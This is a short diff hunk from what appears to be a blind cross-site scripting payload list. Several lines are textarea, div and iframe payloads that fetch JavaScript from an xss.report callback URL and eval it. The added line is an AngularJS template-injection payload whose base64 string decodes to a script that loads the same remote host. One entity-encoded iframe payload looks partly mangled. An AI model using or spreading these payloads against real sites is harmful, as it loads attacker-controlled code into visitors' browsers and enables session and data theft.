@@ -105,3 +105,4 @@ javascript://</script></textarea></style></noscript></noembed></script></templat
 <textarea onfocus="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Focus me</textarea>
 <div onclick="let u='https://xss.report/c/'.concat('hnterx');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
 "><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/hnterx&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
+{{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
